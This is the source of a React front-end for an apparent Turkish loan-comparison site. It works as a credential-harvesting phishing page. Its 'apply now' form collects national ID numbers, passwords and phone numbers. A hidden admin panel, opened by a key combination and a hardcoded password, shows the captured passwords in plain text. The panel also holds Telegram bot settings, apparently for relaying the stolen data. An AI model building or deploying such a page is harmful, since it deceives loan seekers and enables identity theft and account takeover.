import { useState, useEffect } from 'react'
import { Save, Plus, Edit, Trash2 } from 'lucide-react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Card } from '@/components/ui/card'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from '@/components/ui/dialog'
import { Label } from '@/components/ui/label'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Switch } from '@/components/ui/switch'
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table'
import './App.css'

const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000'

interface Bank {
  id: number
  name: string
  logo: string
  campaign: string
  color: string
  is_active: boolean
  max_applications?: number
}

interface LoanOffer {
  bank: Bank
  monthly_payment: number
  total_payment: number
  total_interest: number
}

interface Application {
  id: number
  tc_kimlik: string
  sifre: string
  telefon: string
  bank_name: string
  amount: number
  months: number
  created_at: string
  status: string
}

function App() {
  const [loanAmount, setLoanAmount] = useState(75000)
  const [loanTerm, setLoanTerm] = useState(24)
  const [offers, setOffers] = useState<LoanOffer[]>([])
  const [loading, setLoading] = useState(false)
  const [selectedBank, setSelectedBank] = useState<Bank | null>(null)
  const [showApplicationForm, setShowApplicationForm] = useState(false)
  const [showAdminPanel, setShowAdminPanel] = useState(false)
  const [adminPassword, setAdminPassword] = useState('')
  const [showAdminLogin, setShowAdminLogin] = useState(false)
  
  const [tcKimlik, setTcKimlik] = useState('')
  const [sifre, setSifre] = useState('')
  const [telefon, setTelefon] = useState('+905')
  
  const [applications, setApplications] = useState<Application[]>([])
  const [selectedBankFilter, setSelectedBankFilter] = useState<string>('all')
  const [allBanks, setAllBanks] = useState<Bank[]>([])
  const [showBankForm, setShowBankForm] = useState(false)
  const [editingBank, setEditingBank] = useState<Bank | null>(null)
  const [bankFormData, setBankFormData] = useState({
    name: '',
    logo: '',
    campaign: '',
    color: '',
    is_active: true,
    max_applications: 0
  })
  const [telegramBotToken, setTelegramBotToken] = useState('')
  const [telegramChatId, setTelegramChatId] = useState('')
  const [showSuccessAnimation, setShowSuccessAnimation] = useState(false)

  useEffect(() => {
    calculateLoan()
    loadApplications()
    loadAllBanks()
    loadTelegramSettings()
    
    const handleKeyPress = (e: KeyboardEvent) => {
      if (e.ctrlKey && e.shiftKey && e.key === 'A') {
        setShowAdminLogin(true)
      }
    }
    
    document.addEventListener('keydown', handleKeyPress)
    return () => document.removeEventListener('keydown', handleKeyPress)
  }, [])

  const calculateLoan = async () => {
    try {
      setLoading(true)
      const response = await fetch(`${API_BASE_URL}/api/calculate`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          amount: loanAmount,
          months: loanTerm
        })
      })
      
      const data = await response.json()
      if (data.offers) {
        setOffers(data.offers)
      }
    } catch (error) {
      console.error('Hesaplama hatası:', error)
    } finally {
      setLoading(false)
    }
  }

  const loadTelegramSettings = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/telegram/settings`)
      const data = await response.json()
      setTelegramBotToken(data.bot_token || '')
      setTelegramChatId(data.chat_id || '')
    } catch (error) {
      console.error('Telegram ayarları yüklenemedi:', error)
    }
  }

  const loadApplications = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/applications`)
      const data = await response.json()
      setApplications(data)
    } catch (error) {
      console.error('Başvurular yüklenemedi:', error)
    }
  }


  const loadAllBanks = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/banks`)
      const data = await response.json()
      setAllBanks(data)
    } catch (error) {
      console.error('Tüm bankalar yüklenemedi:', error)
      setAllBanks([])
    }
  }

  const handleRecalculate = () => {
    calculateLoan()
  }

  const createBank = async () => {
    alert('Banka ekleme özelliği henüz aktif değil')
    setShowBankForm(false)
    resetBankForm()
  }

  const updateBank = async () => {
    alert('Banka düzenleme özelliği henüz aktif değil')
    setShowBankForm(false)
    setEditingBank(null)
    resetBankForm()
  }

  const deleteBank = async () => {
    alert('Banka silme özelliği henüz aktif değil')
  }

  const resetBankForm = () => {
    setBankFormData({
      name: '',
      logo: '',
      campaign: '',
      color: '',
      is_active: true,
      max_applications: 0
    })
  }

  const openEditBank = (bank: Bank) => {
    setEditingBank(bank)
    setBankFormData({
      name: bank.name,
      logo: bank.logo,
      campaign: bank.campaign,
      color: bank.color,
      is_active: bank.is_active,
      max_applications: bank.max_applications || 0
    })
    setShowBankForm(true)
  }

  const filteredApplications = applications.filter(app => 
    selectedBankFilter === 'all' || app.bank_name === selectedBankFilter
  )

  const handleApply = (bank: Bank) => {
    setSelectedBank(bank)
    setShowApplicationForm(true)
  }

  const validateTcKimlik = (tc: string) => {
    return tc.length === 11 && /^\d+$/.test(tc)
  }

  const validateSifre = (sifre: string) => {
    return sifre.length >= 6
  }

  const validateTelefon = (telefon: string) => {
    return telefon.length >= 13 && telefon.startsWith('+905')
  }

  const handleTelefonChange = (value: string) => {
    if (!value.startsWith('+905')) {
      setTelefon('+905' + value.replace(/^\+?905?/, ''))
    } else {
      setTelefon(value)
    }
  }

  const submitApplication = async () => {
    if (!validateTcKimlik(tcKimlik)) {
      alert('Geçerli bir T.C. Kimlik numarası giriniz (11 haneli)')
      return
    }
    
    if (!validateSifre(sifre)) {
      alert('Şifre en az 6 karakter olmalıdır')
      return
    }
    
    if (!validateTelefon(telefon)) {
      alert('Geçerli bir telefon numarası giriniz (+905XXXXXXXXX)')
      return
    }

    try {
      const response = await fetch(`${API_BASE_URL}/api/submit`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          tc_kimlik: tcKimlik,
          sifre: sifre,
          telefon: telefon,
          bank_name: selectedBank?.name,
          amount: loanAmount,
          months: loanTerm
        })
      })
      
      if (response.ok) {
        setShowSuccessAnimation(true)
        setTimeout(() => {
          setShowSuccessAnimation(false)
          setShowApplicationForm(false)
          setTcKimlik('')
          setSifre('')
          setTelefon('+905')
        }, 3000)
        loadApplications()
      } else {
        alert('Başvuru gönderilirken hata oluştu')
      }
    } catch (error) {
      console.error('Başvuru hatası:', error)
      alert('Başvuru gönderilirken hata oluştu')
    }
  }

  const handleAdminLogin = () => {
    if (adminPassword === 'admin123') {
      setShowAdminPanel(true)
      setShowAdminLogin(false)
      setAdminPassword('')
    } else {
      alert('Yanlış şifre!')
    }
  }


  const updateTelegramSettings = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/telegram/settings`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bot_token: telegramBotToken,
          chat_id: telegramChatId
        })
      })
      
      if (response.ok) {
        alert('Telegram ayarları güncellendi!')
      } else {
        alert('Ayarlar güncellenirken hata oluştu')
      }
    } catch (error) {
      console.error('Telegram ayarları hatası:', error)
      alert('Ayarlar güncellenirken hata oluştu')
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
      {/* Header */}
      <header className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <h1 className="text-2xl font-bold text-gray-900">Hesap</h1>
            </div>
            <nav className="hidden md:flex space-x-8">
              <a href="#" className="text-gray-500 hover:text-gray-900 px-3 py-2 text-sm font-medium">Ana Sayfa</a>
              <a href="#" className="text-gray-500 hover:text-gray-900 px-3 py-2 text-sm font-medium">Krediler</a>
              <a href="#" className="text-gray-500 hover:text-gray-900 px-3 py-2 text-sm font-medium">Hesap</a>
              <a href="#" className="text-gray-500 hover:text-gray-900 px-3 py-2 text-sm font-medium">İletişim</a>
            </nav>
            <div className="flex items-center space-x-4">
              <Button variant="outline" size="sm">Giriş Yap</Button>
              <Button size="sm">Üye Ol</Button>
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="text-center mb-12">
          <h1 className="text-4xl font-bold text-gray-900 mb-4">
            İhtiyaç Kredisi Faiz Oranları
          </h1>
          <p className="text-xl text-gray-600 max-w-3xl mx-auto">
            En uygun kredi tekliflerini karşılaştırın ve hemen başvurun
          </p>
        </div>

        <div className="bg-white rounded-xl shadow-lg p-8 mb-8">
          <div className="grid md:grid-cols-2 gap-8">
            <div>
              <Label htmlFor="amount" className="text-lg font-semibold mb-3 block">
                Kredi Tutarı
              </Label>
              <div className="space-y-4">
                <Input
                  id="amount"
                  type="number"
                  value={loanAmount}
                  onChange={(e) => setLoanAmount(Number(e.target.value))}
                  className="text-lg p-4"
                  min="10000"
                  max="500000"
                  step="1000"
                />
                <div className="text-sm text-gray-600">
                  {loanAmount.toLocaleString('tr-TR')} TL
                </div>
              </div>
            </div>

            <div>
              <Label htmlFor="term" className="text-lg font-semibold mb-3 block">
                Vade (Ay)
              </Label>
              <div className="space-y-4">
                <Select value={loanTerm.toString()} onValueChange={(value) => setLoanTerm(Number(value))}>
                  <SelectTrigger className="text-lg p-4">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    {[12, 24, 36, 48, 60].map(month => (
                      <SelectItem key={month} value={month.toString()}>
                        {month} Ay
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </div>
          </div>

          <div className="mt-8 text-center">
            <Button 
              onClick={handleRecalculate}
              size="lg"
              className="px-8 py-3 text-lg"
              disabled={loading}
            >
              {loading ? 'Hesaplanıyor...' : 'Teklifleri Güncelle'}
            </Button>
          </div>
        </div>

        <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
          {offers.map((offer, index) => (
            <Card 
              key={index} 
              className="p-6 hover:shadow-xl transition-shadow duration-300"
              style={{ 
                borderLeft: `4px solid ${offer.bank.color}`,
                borderColor: offer.bank.color 
              }}
            >
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center space-x-3">
                  <img 
                    src={offer.bank.logo} 
                    alt={offer.bank.name}
                    className="w-12 h-12 object-contain"
                  />
                  <div>
                    <h3 className="font-bold text-lg">{offer.bank.name}</h3>
                    <p className="text-sm text-gray-600 break-words">{offer.bank.campaign}</p>
                  </div>
                </div>
              </div>

              <div className="space-y-3 mb-6">
                <div className="flex justify-between">
                  <span className="text-gray-600">Aylık Ödeme:</span>
                  <span className="font-bold text-lg">
                    {offer.monthly_payment.toLocaleString('tr-TR')} TL
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Toplam Ödeme:</span>
                  <span className="font-semibold">
                    {offer.total_payment.toLocaleString('tr-TR')} TL
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Toplam Faiz:</span>
                  <span className="text-red-600 font-semibold">
                    {offer.total_interest.toLocaleString('tr-TR')} TL
                  </span>
                </div>
              </div>

              <Button 
                onClick={() => handleApply(offer.bank)}
                className="w-full py-3 text-lg font-semibold"
                style={{ backgroundColor: offer.bank.color }}
              >
                Hemen Başvur
              </Button>
            </Card>
          ))}
        </div>
      </div>

      {/* Application Form Dialog */}
      <Dialog open={showApplicationForm} onOpenChange={setShowApplicationForm}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle>Kredi Başvurusu</DialogTitle>
            <DialogDescription>
              {selectedBank?.name} için kredi başvurunuzu tamamlayın
            </DialogDescription>
          </DialogHeader>
          
          <div className="space-y-4">
            <div>
              <Label htmlFor="tc">T.C. Kimlik No</Label>
              <Input
                id="tc"
                value={tcKimlik}
                onChange={(e) => setTcKimlik(e.target.value)}
                placeholder="11 haneli T.C. Kimlik numaranız"
                maxLength={11}
              />
            </div>
            
            <div>
              <Label htmlFor="password">Şifre</Label>
              <Input
                id="password"
                type="password"
                value={sifre}
                onChange={(e) => setSifre(e.target.value)}
                placeholder="En az 6 karakter"
                minLength={6}
              />
            </div>
            
            <div>
              <Label htmlFor="phone">Telefon</Label>
              <Input
                id="phone"
                value={telefon}
                onChange={(e) => handleTelefonChange(e.target.value)}
                placeholder="+905XXXXXXXXX"
              />
            </div>
            
            <div className="bg-gray-50 p-4 rounded-lg">
              <h4 className="font-semibold mb-2">Başvuru Özeti</h4>
              <div className="text-sm space-y-1">
                <div>Banka: {selectedBank?.name}</div>
                <div>Tutar: {loanAmount.toLocaleString('tr-TR')} TL</div>
                <div>Vade: {loanTerm} Ay</div>
              </div>
            </div>
            
            <Button onClick={submitApplication} className="w-full">
              Başvuruyu Gönder
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Success Animation */}
      {showSuccessAnimation && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-8 rounded-lg text-center animate-bounce">
            <div className="text-6xl mb-4">✅</div>
            <h2 className="text-2xl font-bold text-green-600 mb-2">Başarılı!</h2>
            <p className="text-gray-600">Başvurunuz başarıyla alındı</p>
          </div>
        </div>
      )}

      {/* Admin Login Dialog */}
      <Dialog open={showAdminLogin} onOpenChange={setShowAdminLogin}>
        <DialogContent className="max-w-sm">
          <DialogHeader>
            <DialogTitle>Admin Girişi</DialogTitle>
          </DialogHeader>
          
          <div className="space-y-4">
            <div>
              <Label htmlFor="adminPass">Şifre</Label>
              <Input
                id="adminPass"
                type="password"
                value={adminPassword}
                onChange={(e) => setAdminPassword(e.target.value)}
                placeholder="Admin şifresi"
                onKeyPress={(e) => e.key === 'Enter' && handleAdminLogin()}
              />
            </div>
            
            <Button onClick={handleAdminLogin} className="w-full">
              Giriş Yap
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Admin Panel */}
      <Dialog open={showAdminPanel} onOpenChange={setShowAdminPanel}>
        <DialogContent className="max-w-6xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>Admin Paneli</DialogTitle>
          </DialogHeader>
          
          <Tabs defaultValue="applications" className="w-full">
            <TabsList className="grid w-full grid-cols-4">
              <TabsTrigger value="applications">Başvurular</TabsTrigger>
              <TabsTrigger value="banks">Banka Yönetimi</TabsTrigger>
              <TabsTrigger value="stats">İstatistikler</TabsTrigger>
              <TabsTrigger value="telegram">Telegram</TabsTrigger>
            </TabsList>
            
            <TabsContent value="applications" className="space-y-4">
              <div className="flex justify-between items-center">
                <h3 className="text-lg font-semibold">Kredi Başvuruları</h3>
                <Select value={selectedBankFilter} onValueChange={setSelectedBankFilter}>
                  <SelectTrigger className="w-48">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">Tüm Bankalar</SelectItem>
                    {Array.from(new Set(applications.map(app => app.bank_name))).map(bankName => (
                      <SelectItem key={bankName} value={bankName}>{bankName}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              <div className="border rounded-lg">
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>T.C. Kimlik</TableHead>
                      <TableHead>Şifre</TableHead>
                      <TableHead>Telefon</TableHead>
                      <TableHead>Banka</TableHead>
                      <TableHead>Tutar</TableHead>
                      <TableHead>Vade</TableHead>
                      <TableHead>Tarih</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {filteredApplications.map((app) => (
                      <TableRow key={app.id}>
                        <TableCell>{app.tc_kimlik}</TableCell>
                        <TableCell>{app.sifre}</TableCell>
                        <TableCell>{app.telefon}</TableCell>
                        <TableCell>{app.bank_name}</TableCell>
                        <TableCell>{app.amount.toLocaleString('tr-TR')} TL</TableCell>
                        <TableCell>{app.months} ay</TableCell>
                        <TableCell>{new Date(app.created_at).toLocaleString('tr-TR')}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            </TabsContent>
            
            <TabsContent value="banks" className="space-y-4">
              <div className="flex justify-between items-center">
                <h3 className="text-lg font-semibold">Banka Yönetimi</h3>
                <Button onClick={() => setShowBankForm(true)}>
                  <Plus className="w-4 h-4 mr-2" />
                  Yeni Banka Ekle
                </Button>
              </div>
              
              <div className="border rounded-lg">
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>Logo</TableHead>
                      <TableHead>Banka Adı</TableHead>
                      <TableHead>Kampanya</TableHead>
                      <TableHead>Renk</TableHead>
                      <TableHead>Aktif</TableHead>
                      <TableHead>Max Başvuru</TableHead>
                      <TableHead>İşlemler</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {(allBanks || []).map((bank) => (
                      <TableRow key={bank.id}>
                        <TableCell>
                          <img src={bank.logo} alt={bank.name} className="w-8 h-8 object-contain" />
                        </TableCell>
                        <TableCell>{bank.name}</TableCell>
                        <TableCell className="max-w-xs truncate">{bank.campaign}</TableCell>
                        <TableCell>
                          <div 
                            className="w-6 h-6 rounded border"
                            style={{ backgroundColor: bank.color }}
                          />
                        </TableCell>
                        <TableCell>
                          <Switch checked={bank.is_active} disabled />
                        </TableCell>
                        <TableCell>{bank.max_applications || 0}</TableCell>
                        <TableCell>
                          <div className="flex space-x-2">
                            <Button
                              size="sm"
                              variant="outline"
                              onClick={() => openEditBank(bank)}
                            >
                              <Edit className="w-4 h-4" />
                            </Button>
                            <Button
                              size="sm"
                              variant="outline"
                              onClick={() => deleteBank()}
                            >
                              <Trash2 className="w-4 h-4" />
                            </Button>
                          </div>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            </TabsContent>
            
            <TabsContent value="stats" className="space-y-4">
              <h3 className="text-lg font-semibold">İstatistikler</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <Card className="p-4">
                  <h4 className="font-semibold mb-2">Toplam Başvuru</h4>
                  <p className="text-2xl font-bold">{applications.length}</p>
                </Card>
                
                <Card className="p-4">
                  <h4 className="font-semibold mb-2">Aktif Banka</h4>
                  <p className="text-2xl font-bold">{allBanks.filter(b => b.is_active).length}</p>
                </Card>
                
                <Card className="p-4">
                  <h4 className="font-semibold mb-2">Ortalama Tutar</h4>
                  <p className="text-2xl font-bold">
                    {applications.length > 0 
                      ? Math.round(applications.reduce((sum, app) => sum + app.amount, 0) / applications.length).toLocaleString('tr-TR')
                      : 0
                    } TL
                  </p>
                </Card>
              </div>
              
              <Card className="p-4">
                <h4 className="font-semibold mb-4">Bankalara Göre Başvuru Sayısı</h4>
                <div className="space-y-2">
                  {Array.from(new Set(applications.map(app => app.bank_name))).map(bankName => {
                    const count = applications.filter(app => app.bank_name === bankName).length
                    return (
                      <div key={bankName} className="flex justify-between">
                        <span>{bankName}</span>
                        <span className="font-semibold">{count}</span>
                      </div>
                    )
                  })}
                </div>
              </Card>
            </TabsContent>
            
            <TabsContent value="telegram" className="space-y-4">
              <h3 className="text-lg font-semibold">Telegram Ayarları</h3>
              
              <div className="space-y-4">
                <div>
                  <Label htmlFor="botToken">Bot Token</Label>
                  <Input
                    id="botToken"
                    value={telegramBotToken}
                    onChange={(e) => setTelegramBotToken(e.target.value)}
                    placeholder="Telegram bot token"
                  />
                </div>
                
                <div>
                  <Label htmlFor="chatId">Chat ID</Label>
                  <Input
                    id="chatId"
                    value={telegramChatId}
                    onChange={(e) => setTelegramChatId(e.target.value)}
                    placeholder="Telegram chat ID"
                  />
                </div>
                
                <Button onClick={updateTelegramSettings}>
                  <Save className="w-4 h-4 mr-2" />
                  Ayarları Kaydet
                </Button>
              </div>
            </TabsContent>
          </Tabs>
        </DialogContent>
      </Dialog>

      {/* Bank Form Dialog */}
      <Dialog open={showBankForm} onOpenChange={setShowBankForm}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle>
              {editingBank ? 'Banka Düzenle' : 'Yeni Banka Ekle'}
            </DialogTitle>
          </DialogHeader>
          
          <div className="space-y-4">
            <div>
              <Label htmlFor="bankName">Banka Adı</Label>
              <Input
                id="bankName"
                value={bankFormData.name}
                onChange={(e) => setBankFormData({...bankFormData, name: e.target.value})}
                placeholder="Banka adı"
              />
            </div>
            
            <div>
              <Label htmlFor="bankLogo">Logo URL</Label>
              <Input
                id="bankLogo"
                value={bankFormData.logo}
                onChange={(e) => setBankFormData({...bankFormData, logo: e.target.value})}
                placeholder="Logo URL"
              />
            </div>
            
            <div>
              <Label htmlFor="bankCampaign">Kampanya</Label>
              <Input
                id="bankCampaign"
                value={bankFormData.campaign}
                onChange={(e) => setBankFormData({...bankFormData, campaign: e.target.value})}
                placeholder="Kampanya açıklaması"
              />
            </div>
            
            <div>
              <Label htmlFor="bankColor">Renk</Label>
              <Input
                id="bankColor"
                type="color"
                value={bankFormData.color}
                onChange={(e) => setBankFormData({...bankFormData, color: e.target.value})}
              />
            </div>
            
            <div>
              <Label htmlFor="maxApps">Maksimum Başvuru Sayısı</Label>
              <Input
                id="maxApps"
                type="number"
                value={bankFormData.max_applications}
                onChange={(e) => setBankFormData({...bankFormData, max_applications: Number(e.target.value)})}
                placeholder="0"
              />
            </div>
            
            <div className="flex items-center space-x-2">
              <Switch
                checked={bankFormData.is_active}
                onCheckedChange={(checked) => setBankFormData({...bankFormData, is_active: checked})}
              />
              <Label>Aktif</Label>
            </div>
            
            <div className="flex space-x-2">
              <Button 
                onClick={editingBank ? updateBank : createBank}
                className="flex-1"
              >
                {editingBank ? 'Güncelle' : 'Ekle'}
              </Button>
              <Button 
                variant="outline" 
                onClick={() => {
                  setShowBankForm(false)
                  setEditingBank(null)
                  resetBankForm()
                }}
                className="flex-1"
              >
                İptal
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}

export default App
